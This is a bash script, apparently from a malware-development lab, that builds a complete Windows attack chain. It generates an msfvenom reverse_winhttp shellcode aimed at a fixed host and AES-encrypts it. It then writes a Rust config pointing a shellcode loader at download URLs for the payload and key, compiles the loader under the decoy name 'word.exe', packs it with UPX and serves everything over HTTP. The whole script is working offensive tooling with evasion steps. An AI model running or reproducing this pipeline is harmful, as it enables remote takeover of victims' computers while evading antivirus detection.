#!/bin/bash

echo
echo -e "\e[1;32m#################### GENERATE PAYLOAD #####################\e[0m"

HOST="192.168.63.132"
PAYLOAD="shellcode.bin"
STORED_PATH="$HOME/BashScript/Malware-TCM/bin"

EXEC_PATH="$HOME/Desktop/malware_dev/verRust/temp"
RELEASE_PATH="$EXEC_PATH/target/x86_64-pc-windows-gnu/release"

SERVER_PORT="80"

echo
echo -e "\e[1;35mHost:\e[0m $HOST"
echo -e "\e[1;35mPort:\e[0m 1234 (default)"
echo -e "\e[1;35mPayload:\e[0m $PAYLOAD"

echo
echo -e "\e[1;34m---- (+) Generating payload with msfvenom for host $HOST:1234\e[0m"
echo -e "\e[1;35mCommand:\e[0m msfvenom --payload windows/x64/custom/reverse_winhttp LHOST=\"$HOST\" LPORT=1234 LURI=/hello.woff --format raw --out /tmp/$PAYLOAD"
msfvenom --payload windows/x64/custom/reverse_winhttp LHOST="$HOST" LPORT=1234 LURI=/hello.woff --format raw --out /tmp/"$PAYLOAD"

echo
echo -e "\e[1;34m---- (+) Copying payload to $STORED_PATH:\e[0m"
echo -e "\e[1;35mPayload's path:\e[0m $STORED_PATH/$PAYLOAD"
cp /tmp/"$PAYLOAD" "$STORED_PATH"

echo
echo -e "\e[1;34m---- (+) Encrypting payload:\e[0m"
cd "$STORED_PATH" && 
	#python3 aes.py -encrypt "$PAYLOAD"
	./aes -encrypt "$PAYLOAD"

echo
echo -e "\e[1;34m---- (+) Finish encrypting, start checking:\e[0m"
ls -lha | grep "key.txt" && ls -lha | grep "$PAYLOAD"

echo
echo -e "\e[1;34m---- (+) Decrypting to check with sha1sum:\e[0m"
#python3 aes.py -decrypt "$PAYLOAD"_encrypted key.txt
./aes -decrypt "$PAYLOAD"_encrypted key.txt &&
	sha1sum "$PAYLOAD"_encrypted &&
	sha1sum decrypted.bin &&
	sha1sum "$PAYLOAD"

echo 
echo 
echo
echo -e "\e[1;32m#################### COMPILE #####################\e[0m"

echo
echo -e "\e[1;35mRust code path:\e[0m $EXEC_PATH"
echo -e "\e[1;35mProgram path:\e[0m $RELEASE_PATH"
echo -e "\e[1;35mProgram:\e[0m word.exe (default)"

echo
echo -e "\e[1;34m---- (+) Making config file:\e[0m"
cd "$EXEC_PATH" || { echo "Failed to cd to $EXEC_PATH"; exit 1; }
cat > ./src/config.rs <<EOF
pub const ENCRYPTED_URL: &str = "http://$HOST/${PAYLOAD}_encrypted";
pub const KEY_URL: &str = "http://$HOST/key.txt";
EOF
echo "  ==> Config file created at $EXEC_PATH/src/config.rs"

echo
echo -e "\e[1;34m---- (+) Compiling shellcode loader:\e[0m"
cargo build --target x86_64-pc-windows-gnu --release

echo
echo -e "\e[1;34m---- (+) Completed compile:\e[0m"
cd "$EXEC_PATH"/target/x86_64-pc-windows-gnu/release && ls -lha | grep "word.exe"

echo
echo
echo
echo -e "\e[1;32m#################### PACKETING /w UPX #####################\e[0m"
echo
cd "$RELEASE_PATH" && upx --best word.exe

echo
echo -e "\e[1;34m---- (+) Copy word.exe to the same folder with $PAYLOAD:\e[0m"
cp "$RELEASE_PATH"/word.exe "$STORED_PATH"

echo
echo
echo
echo -e "\e[1;32m#################### HOST SERVER #####################\e[0m"

echo
echo "(+) pwd: $STORED_PATH"
echo "   ==> http://$HOST/${PAYLOAD}_encrypted"
echo "   ==> http://$HOST/key.txt"
echo
cd "$STORED_PATH"
python3 -m http.server "$SERVER_PORT"
